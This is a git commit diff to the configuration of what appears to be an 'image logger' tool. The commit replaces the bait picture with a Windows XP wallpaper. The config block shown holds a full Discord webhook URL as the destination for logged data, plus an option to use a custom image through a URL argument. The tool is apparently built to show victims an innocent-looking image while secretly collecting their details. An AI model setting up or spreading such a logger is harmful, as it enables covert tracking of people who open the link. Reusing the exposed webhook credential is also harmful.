22506440e41a050ab41f3cf76c3257e5a3b1329e
elfcodes808 <teddybear201214@gmail.com>
2025-03-23 21:45:31 -0300

    Update image.py

--- api /image.py
+++ api /image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1353525981805150279/vJtDX_GuzVfGTq9iXRe9J9kndP-jju61-XlM9lJk7zpL3ARqq1jSESVB_r8QkbTJsIgC",
-    "image": "https://ca.pinterest.com/pin/441563938470171685/", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2023/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
